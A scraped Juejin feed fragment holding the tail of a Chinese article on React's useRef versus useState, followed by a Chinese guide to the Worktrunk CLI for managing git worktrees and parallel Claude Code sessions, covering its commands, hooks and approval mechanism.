<table><thead><tr><th>特性</th><th><code>useState</code></th><th><code>useRef</code></th></tr></thead><tbody><tr><td>是否触发重渲染</td><td>✅ 是</td><td>❌ 否</td></tr><tr><td>值变更是否被 React 跟踪</td><td>✅ 是（通过调度更新）</td><td>❌ 否</td></tr><tr><td>适用场景</td><td>驱动 UI 变化的状态</td><td>存储不需触发 UI 更新的可变数据</td></tr><tr><td>初始值</td><td>每次调用 <code>useState(initial)</code> 仅在首次生效</td><td><code>useRef(initial)</code> 的初始值也仅在首次生效，但后续 <code>.current</code> 可任意修改</td></tr></tbody></table>
<h3 data-id="heading-4">常见误区：能否用 useRef 替代 useState？</h3>
<p><strong>不能。</strong></p>
<p>假设你试图用 <code>useRef</code> 存储计数器值以“避免重渲染”：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// ...</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> countRef.current++}&gt;+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{countRef.current}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
</code></pre>
<p>你会发现：点击按钮后，页面上的数字<strong>不会更新</strong>！因为 React 并不知道 <code>countRef.current</code> 发生了变化，自然不会重新执行渲染逻辑。</p>
<p><strong>结论</strong>：</p>
<ul>
<li>如果你需要<strong>同时存储值并更新 UI</strong>，必须使用 <code>useState</code>；</li>
<li>如果你只需要<strong>在不触发重渲染的前提下保存中间状态或引用</strong>（如定时器 ID、前一次的 props、滚动位置等），才应使用 <code>useRef</code>。</li>
</ul>
<hr/>
<h2 data-id="heading-5">五、useRef 的典型应用场景总结</h2>
<ol>
<li>
<p><strong>访问 DOM 节点</strong><br/>
如聚焦输入框、测量元素尺寸、触发动画等。</p>
</li>
<li>
<p><strong>持久化存储可变值</strong></p>
<ul>
<li>定时器/延时器 ID（<code>setInterval</code> / <code>setTimeout</code>）</li>
<li>WebSocket 实例</li>
<li>第三方库的实例（如地图、图表对象）</li>
<li>上一次的 props 或 state（用于对比）</li>
</ul>
</li>
<li>
<p><strong>跨渲染保持状态而不触发更新</strong><br/>
例如记录组件是否已挂载（在异步回调中判断是否还能安全 setState）。</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-6">结语</h2>
<p><code>useRef</code> 虽然名字里有 “ref”，但它远不止是“获取 DOM 的工具”。它是一个<strong>轻量级、非响应式的持久化容器</strong>，在需要“记住某些东西但又不想打扰 React 渲染流程”时大显身手。</p>
<p>正确使用 <code>useRef</code>，能让你的组件更高效、更健壮；而误用它（如试图替代状态管理），则会导致 UI 不更新或逻辑错乱。理解其“非响应式”和“引用持久化”的两大特性，是掌握这一 Hook 的关键。</p>
<p>在实际开发中，当你遇到以下情况时，不妨想想 <code>useRef</code>：</p>
<ul>
<li>“我需要在组件里保存一个值，但它变了不需要刷新页面。”</li>
<li>“我想在挂载后操作某个 DOM 元素。”</li>
<li>“我的定时器怎么关不掉了？是不是 ID 丢了？”</li>
</ul>
<p>答案，往往就在 <code>useRef</code> 之中。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Worktrunk 完全指南：让 Git Worktree 和 Claude Code 和平共处]]></title>    <link>https://juejin.cn/post/7589828815939633206</link>    <guid>https://juejin.cn/post/7589828815939633206</guid>    <pubDate>2025-12-31T12:27:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589828815939633206" data-draft-id="7589838714449887273" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Worktrunk 完全指南：让 Git Worktree 和 Claude Code 和平共处"/> <meta itemprop="keywords" content="前端,AI编程,Claude"/> <meta itemprop="datePublished" content="2025-12-31T12:27:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cos"/> <meta itemprop="url" content="https://juejin.cn/user/1698115646132254"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Worktrunk 完全指南：让 Git Worktree 和 Claude Code 和平共处
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1698115646132254/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cos
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T12:27:31.000Z" title="Wed Dec 31 2025 12:27:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cosine.ren%2Fpost%2Fgit-worktrunk-guide" target="_blank" title="https://blog.cosine.ren/post/git-worktrunk-guide" ref="nofollow noopener noreferrer">blog.cosine.ren/post/git-wo…</a></p>
</blockquote>
<h2 data-id="heading-0">写在前面</h2>
<p>最近用 Claude Code 写代码的频率越来越高，有时候会同时开三四个任务：一个在修 bug，一个在加新功能，一个在 review 中，还有一个在跑测试验证新点子。问题来了：它们都需要独立的工作目录，不然会互相串代码。</p>
<p>Git 的 <code>worktree</code> 功能本来就是为这种场景设计的，但原生命令实在有些啰嗦。传统创建一个新 worktree 要这样：</p>
<pre><code class="hljs language-bash" lang="bash">git worktree add -b feature-auth ../myproject-feature-auth
<span class="hljs-built_in">cd</span> ../myproject-feature-auth
</code></pre>
<p>删掉它又得回到主目录：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> ../myproject
git worktree remove ../myproject-feature-auth
git branch -d feature-auth
</code></pre>
<p>分支名要输三次，每次都要手动 <code>cd</code>。干这事儿多了，会觉得有些浪费生命，这也是我之前为什么不喜欢 worktree。</p>
<p>直到发现 <a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2F" target="_blank" title="https://worktrunk.dev/" ref="nofollow noopener noreferrer">Worktrunk</a>，才发现 worktree 管理原来可以这么优雅（当然还有很多别的工具）。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmax_sixty%2Fstatus%2F2006077845391724739" target="_blank" title="https://x.com/max_sixty/status/2006077845391724739" ref="nofollow noopener noreferrer">x.com/max_sixty/s…</a></p>
<p>用下来感觉非常好，写一篇博客卖一卖安利。</p>
<h2 data-id="heading-1">Worktrunk 是什么</h2>
<p>简单来说，Worktrunk 是一个 <strong>Git Worktree 的 CLI 包装工具</strong>，专门为<strong>并行运行多个 AI Agent</strong> 的场景优化。它的核心理念是：</p>
<blockquote>
<p><strong>每个 worktree 对应一个分支，用分支名管理 worktree，路径自动生成。</strong></p>
</blockquote>
<p>对比一下命令差异就能感受到差异：</p>






























<table><thead><tr><th>任务</th><th>Worktrunk</th><th>原生 Git</th></tr></thead><tbody><tr><td>切换到某个 worktree</td><td><code>wt switch feat</code></td><td><code>cd ../repo.feat</code></td></tr><tr><td>创建 worktree + 启动 Claude</td><td><code>wt switch -c -x claude feat</code></td><td><code>git worktree add -b feat ../repo.feat &amp;&amp; cd ../repo.feat &amp;&amp; claude</code></td></tr><tr><td>清理当前 worktree</td><td><code>wt remove</code></td><td><code>cd ../repo &amp;&amp; git worktree remove ../repo.feat &amp;&amp; git branch -d feat</code></td></tr><tr><td>列出所有 worktree 状态</td><td><code>wt list</code></td><td><code>git worktree list</code> (只显示路径)</td></tr></tbody></table>
<p>基本就是把 <code>git worktree</code> 的操作复杂度从「记三个参数」降到「说个分支名」。</p>
<h2 data-id="heading-2">为什么需要 Worktrunk?</h2>
<p>如果你只是偶尔用一下 worktree，原生命令当然就行了。但当你需要<strong>频繁并行开发</strong>（比如同时跑多个 AI Agent）或者<strong>需要自动化流程</strong>（创建 worktree 后自动装依赖、跑测试）的时候，Worktrunk 能省下不少时间和心智负担。它本质上是把「用 worktree 的正确姿势」固化成了工具。</p>
<h2 data-id="heading-3">安装与配置</h2>
<h3 data-id="heading-4">安装</h3>
<p><strong>macOS/Linux (推荐 Homebrew)：</strong></p>
<pre><code class="hljs language-bash" lang="bash">brew install max-sixty/worktrunk/wt
</code></pre>
<p><strong>或者用 Cargo：</strong></p>
<pre><code class="hljs language-bash" lang="bash">cargo install worktrunk
</code></pre>
<h3 data-id="heading-5">Shell 集成</h3>
<p>装完之后<strong>必须跑这一步</strong>，否则 <code>wt switch</code> 无法切换目录：</p>
<pre><code class="hljs language-bash" lang="bash">wt config shell install
</code></pre>
<p>它会在你的 <code>.zshrc</code> 或 <code>.bashrc</code> 里加一段函数，让 <code>wt</code> 命令可以改变当前 shell 的工作目录。</p>
<p>装完重启终端，跑 <code>wt --version</code> 确认安装成功。</p>
<h2 data-id="heading-6">核心命令详解</h2>
<h3 data-id="heading-7"><code>wt switch</code> - 切换/创建 Worktree</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fswitch%2F" target="_blank" title="https://worktrunk.dev/switch/" ref="nofollow noopener noreferrer">wt switch | Worktrunk</a></p>
<p>这是最常用的命令，用法极简：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 切换到已存在的 worktree (分支名 feat)</span>
wt switch feat

<span class="hljs-comment"># 基于主分支 main 创建新 worktree + 分支 feat</span>
wt switch -c feat

<span class="hljs-comment"># 创建 worktree + 自动启动 Claude Code</span>
wt switch -c feat -x claude

<span class="hljs-comment"># 基于 dev 分支创建新 worktree + 分支 feat-new (而不是 main) + 自动启动 claude</span>
wt switch -c feat-new -b dev -x claude
</code></pre>
<p><strong>路径规则</strong>： Worktrunk 会自动在主仓库的<strong>同级目录</strong>下创建 worktree，命名格式是 <code>&lt;repo&gt;.&lt;branch&gt;</code>。比如主仓库在 <code>~/code/myproject</code>，分支 <code>feat</code> 的 worktree 就在 <code>~/code/myproject.feat</code>。</p>
<p><strong>参数说明</strong>：</p>
<ul>
<li><code>-c</code> / <code>--create</code>：创建新 worktree + 分支</li>
<li><code>-x &lt;cmd&gt;</code>：切换后自动执行命令 (比如 <code>claude</code>, <code>code</code>, <code>npm install</code>)</li>
<li><code>-b &lt;base&gt;</code>：指定基础分支 (默认是 <code>main</code>)</li>
</ul>

























<table><thead><tr><th>Shortcut</th><th>含义</th></tr></thead><tbody><tr><td><code>^</code></td><td>默认分支（main/master）</td></tr><tr><td><code>@</code></td><td>当前分支/工作树</td></tr><tr><td><code>-</code></td><td>之前的工作目录（例如 <code>cd -</code> ）</td></tr><tr><td/><td/></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">wt switch -                      <span class="hljs-comment"># Back to previous</span>
wt switch ^                      <span class="hljs-comment"># Default branch worktree</span>
wt switch --create fix --base=@  <span class="hljs-comment"># Branch from current HEAD</span>
</code></pre>
<h4 data-id="heading-8">实战场景</h4>
<p>假设你在跑三个并行任务：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Terminal 1: 修复认证 bug</span>
wt switch -c -x claude fix-auth

<span class="hljs-comment"># Terminal 2: 重构 API</span>
wt switch -c -x claude refactor-api

<span class="hljs-comment"># Terminal 3: 加新功能</span>
wt switch -c -x claude feat-dashboard
</code></pre>
<p>每个 Claude 实例跑在独立目录里，互不干扰。</p>
<h3 data-id="heading-9"><code>wt list</code> - 查看所有 Worktree</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Flist%2F" target="_blank" title="https://worktrunk.dev/list/" ref="nofollow noopener noreferrer">wt list | Worktrunk</a></p>
<pre><code class="hljs language-bash" lang="bash">wt list
</code></pre>
<p>输出大概长这样:</p>
<pre><code class="hljs language-bash" lang="bash">wt list
  Branch       Status        HEAD±    main↕  Remote⇅  Commit    Age   Message
@ feature-api  +   ↕⇡     +54   -5   ↑4  ↓1   ⇡3      ec97decc  30m   Add API tests
^ main             ^⇅                         ⇡1  ⇣1  6088adb3  4d    Merge fix-auth: hardened to…
+ fix-auth         ↕|                ↑2  ↓1     |     127407de  5h    Add secure token storage

○ Showing 3 worktrees, 1 with changes, 2 ahead, 1 column hidden
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7338c58af7841be90ac2fdbd1eaae97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767788851&amp;x-signature=5bLsTOb8NbUHYlJe57%2BIwRewF4k%3D" alt="" loading="lazy"/></p>
<p>比原生 <code>git worktree list</code> 强很多，可以看到很多信息</p>
<ul>
<li><strong>Git 状态</strong>：有多少未提交/未追踪文件</li>
<li><strong>CI 状态</strong>：如果配置了 GitHub Actions,会显示最新的构建状态</li>
</ul>
<p>对于管理多个 worktree 来说,这个视图非常实用。</p>
<h3 data-id="heading-10"><code>wt remove</code> - 清理 Worktree</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fremove%2F" target="_blank" title="https://worktrunk.dev/remove/" ref="nofollow noopener noreferrer">wt remove | Worktrunk</a></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 删除当前 worktree + 分支</span>
wt remove

<span class="hljs-comment"># 删除指定 worktree</span>
wt remove feature-branch
wt remove old-feature another-branch

<span class="hljs-comment"># 删除 worktree 但保留分支</span>
wt remove --no-delete-branch feature-branch

<span class="hljs-comment"># 强制删除未合并的分支</span>
wt remove -D experimental
</code></pre>
<h3 data-id="heading-11"><code>wt merge</code> - 合并工作流</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fmerge%2F" target="_blank" title="https://worktrunk.dev/merge/" ref="nofollow noopener noreferrer">wt merge | Worktrunk</a></p>
<p>这个命令封装了「合并 → 清理」的完整流程：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 把当前 worktree 合并到默认分支 如 main</span>
wt merge
<span class="hljs-comment"># 把当前 worktree 合并到 dev 分支</span>
wt merge dev
<span class="hljs-comment"># 合并后保留工作树</span>
wt merge --no-remove
<span class="hljs-comment"># 保留提交历史（不合并）</span>
wt merge --no-squash
<span class="hljs-comment"># 跳过提交/合并（除非使用 --no-rebase 参数，否则 rebase 仍会运行）</span>
wt merge --no-commit
</code></pre>
<p>如果配置了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fhook%2F" target="_blank" title="https://worktrunk.dev/hook/" ref="nofollow noopener noreferrer"><strong>pre-merge hook</strong></a>，会在合并前自动跑测试或 lint。</p>
<h3 data-id="heading-12"><code>wt select</code> - 交互式选择器</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fselect%2F" target="_blank" title="https://worktrunk.dev/select/" ref="nofollow noopener noreferrer">wt select | Worktrunk</a></p>
<p>如果你记不清 worktree 名字,可以用 <code>select</code> 命令:</p>
<pre><code class="hljs language-bash" lang="bash">wt select
</code></pre>
<p>会弹出一个 fzf 风格的界面,用方向键选择要切换的 worktree。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db7db9a9a114ac6ac6a4697197ee3ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767788851&amp;x-signature=b1KFa4lgCDpAeGIx0biuEE%2FOsrU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-13">Hooks</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fhook%2F" target="_blank" title="https://worktrunk.dev/hook/" ref="nofollow noopener noreferrer">wt hook | Worktrunk</a></p>
<p>Worktrunk 支持在 worktree 生命周期的不同阶段执行命令，同时支持全局用户 hook 配置（<code>~/.config/worktrunk/config.toml</code> ）和项目 hook 配置（ <code>.config/wt.toml</code>）
好的,我只给你补充 Hook 系统这一段内容:</p>
<h3 data-id="heading-14">Hook 类型一览</h3>





















































<table><thead><tr><th>Hook</th><th>触发时机</th><th>阻塞模式</th><th>失败即停</th></tr></thead><tbody><tr><td><code>post-create</code></td><td>worktree 创建后</td><td>是</td><td>否</td></tr><tr><td><code>post-start</code></td><td>worktree 创建后</td><td>否(后台)</td><td>否</td></tr><tr><td><code>post-switch</code></td><td>每次切换后</td><td>否(后台)</td><td>否</td></tr><tr><td><code>pre-commit</code></td><td>merge 时提交前</td><td>是</td><td>是</td></tr><tr><td><code>pre-merge</code></td><td>合并到目标分支前</td><td>是</td><td>是</td></tr><tr><td><code>post-merge</code></td><td>合并成功后</td><td>是</td><td>否</td></tr><tr><td><code>pre-remove</code></td><td>worktree 删除前</td><td>是</td><td>是</td></tr></tbody></table>
<p><strong>阻塞模式</strong>: 命令执行完成前,主流程会等待<br/>
<strong>失败即停</strong>: 第一个失败的命令会中止整个操作</p>
<h3 data-id="heading-15">核心 Hooks 说明</h3>
<p><strong>post-create</strong> - worktree 创建后立即执行,会阻塞直到完成:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[post-create]</span>
<span class="hljs-attr">install</span> = <span class="hljs-string">"npm ci"</span>                    <span class="hljs-comment"># 安装依赖</span>
<span class="hljs-attr">migrate</span> = <span class="hljs-string">"npm run db:migrate"</span>        <span class="hljs-comment"># 数据库迁移</span>
<span class="hljs-attr">env</span> = <span class="hljs-string">"cp .env.example .env"</span>          <span class="hljs-comment"># 复制环境配置</span>
</code></pre>
<p><strong>post-start</strong> - worktree 创建后在后台执行,不阻塞切换:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[post-start]</span>
<span class="hljs-attr">build</span> = <span class="hljs-string">"npm run build"</span>               <span class="hljs-comment"># 构建项目</span>
<span class="hljs-attr">server</span> = <span class="hljs-string">"npm run dev"</span>                <span class="hljs-comment"># 启动开发服务器</span>
</code></pre>
<p>日志输出到 <code>.git/wt-logs/{branch}-{source}-post-start-{name}.log</code></p>
<p><strong>post-switch</strong> - 每次 <code>wt switch</code> 后在后台执行(无论是新建、切换还是切到当前):</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-attr">post-switch</span> = <span class="hljs-string">"echo 'Switched to {{ branch }}'"</span>
</code></pre>
<p><strong>pre-commit</strong> - merge 时提交前执行,失败即停:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[pre-commit]</span>
<span class="hljs-attr">format</span> = <span class="hljs-string">"cargo fmt -- --check"</span>       <span class="hljs-comment"># 代码格式检查</span>
<span class="hljs-attr">lint</span> = <span class="hljs-string">"cargo clippy -- -D warnings"</span>  <span class="hljs-comment"># Lint 检查</span>
</code></pre>
<p><strong>pre-merge</strong> - 合并到目标分支前执行,失败即停:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[pre-merge]</span>
<span class="hljs-attr">test</span> = <span class="hljs-string">"cargo test"</span>                   <span class="hljs-comment"># 运行测试</span>
<span class="hljs-attr">build</span> = <span class="hljs-string">"cargo build --release"</span>       <span class="hljs-comment"># 生产构建</span>
</code></pre>
<p><strong>post-merge</strong> - 合并成功后在目标分支的 worktree 执行(如果存在),否则在主 worktree 执行:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-attr">post-merge</span> = <span class="hljs-string">"cargo install --path ."</span>
</code></pre>
<p><strong>pre-remove</strong> - worktree 删除前执行,失败即停:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[pre-remove]</span>
<span class="hljs-attr">cleanup</span> = <span class="hljs-string">"rm -rf /tmp/cache/{{ branch }}"</span>
</code></pre>
<h3 data-id="heading-16">模板变量</h3>
<p>Hook 命令支持模板变量,运行时自动展开:</p>






































































<table><thead><tr><th>变量</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td><code>{{ repo }}</code></td><td>my-project</td><td>仓库名</td></tr><tr><td><code>{{ branch }}</code></td><td>feature-foo</td><td>分支名</td></tr><tr><td><code>{{ worktree }}</code></td><td>/path/to/worktree</td><td>worktree 绝对路径</td></tr><tr><td><code>{{ worktree_name }}</code></td><td>my-project.feature-foo</td><td>worktree 目录名</td></tr><tr><td><code>{{ repo_root }}</code></td><td>/path/to/main</td><td>主仓库根路径</td></tr><tr><td><code>{{ default_branch }}</code></td><td>main</td><td>默认分支名</td></tr><tr><td><code>{{ commit }}</code></td><td>a1b2c3d4e5f6...</td><td>HEAD 完整 SHA</td></tr><tr><td><code>{{ short_commit }}</code></td><td>a1b2c3d</td><td>HEAD 短 SHA</td></tr><tr><td><code>{{ remote }}</code></td><td>origin</td><td>主远程名称</td></tr><tr><td><code>{{ remote_url }}</code></td><td><a href="https://link.juejin.cn?target=mailto%3Agit%40github.com" target="_blank" title="mailto:git@github.com" ref="nofollow noopener noreferrer">git@github.com</a>:user/repo.git</td><td>远程 URL</td></tr><tr><td><code>{{ upstream }}</code></td><td>origin/feature</td><td>上游跟踪分支</td></tr><tr><td><code>{{ target }}</code></td><td>main</td><td>目标分支(仅 merge hooks)</td></tr></tbody></table>
<h3 data-id="heading-17">安全机制</h3>
<p>项目 hook(<code>.config/wt.toml</code>)首次运行需要用户批准:</p>
<pre><code class="hljs language-plain" lang="plain">▲ repo needs approval to execute 3 commands:
○ post-create install:
  echo 'Installing dependencies...'
❯ Allow and remember? [y/N]
</code></pre>
<ul>
<li>批准记录保存在用户配置中</li>
<li>命令变更需要重新批准</li>
<li><code>--yes</code> 跳过提示(适用于 CI)</li>
<li><code>--no-verify</code> 完全跳过 hooks</li>
</ul>
<p>管理批准记录:</p>
<pre><code class="hljs language-bash" lang="bash">wt hook approvals add      <span class="hljs-comment"># 预批准当前项目所有命令</span>
wt hook approvals clear    <span class="hljs-comment"># 清除当前项目批准</span>
wt hook approvals clear --global  <span class="hljs-comment"># 清除全局批准</span>
</code></pre>
<h3 data-id="heading-18">用户级 Hooks</h3>
<p>在 <code>~/.config/worktrunk/config.toml</code> 中配置的 hook 会对所有仓库生效,且不需要批准:</p>






























<table><thead><tr><th>维度</th><th>项目 hook</th><th>用户 hook</th></tr></thead><tbody><tr><td>配置位置</td><td><code>.config/wt.toml</code></td><td><code>~/.config/worktrunk/config.toml</code></td></tr><tr><td>作用范围</td><td>单个仓库</td><td>所有仓库</td></tr><tr><td>需要批准</td><td>是</td><td>否</td></tr><tr><td>执行顺序</td><td>后执行</td><td>先执行</td></tr></tbody></table>
<p>我觉得看下来，这个 hook 非常重要，可以<strong>复用主 worktree 的缓存</strong>:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[post-create]</span>
<span class="hljs-comment"># 软链接 node_modules 避免重复安装</span>
<span class="hljs-attr">cache</span> = <span class="hljs-string">"ln -sf {{ repo_root }}/node_modules node_modules"</span>
<span class="hljs-attr">env</span> = <span class="hljs-string">"cp {{ repo_root }}/.env.local .env"</span>
</code></pre>
<h3 data-id="heading-19">独立运行 Hooks</h3>
<p>除了自动触发,也可以手动运行 hook 进行测试或重试:</p>
<pre><code class="hljs language-bash" lang="bash">wt hook pre-merge           <span class="hljs-comment"># 运行 pre-merge hooks</span>
wt hook pre-merge --<span class="hljs-built_in">yes</span>     <span class="hljs-comment"># 跳过批准提示(适用于 CI)</span>
wt hook show                <span class="hljs-comment"># 查看所有已配置的 hooks</span>
</code></pre>
<p><strong>适用场景</strong>: Hook 开发测试、CI 流水线、失败后重试等。</p>
<h3 data-id="heading-20">Claude Code 插件监测状态</h3>
<pre><code class="hljs language-bash" lang="bash">claude plugin marketplace add max-sixty/worktrunk
claude plugin install worktrunk@worktrunk
</code></pre>
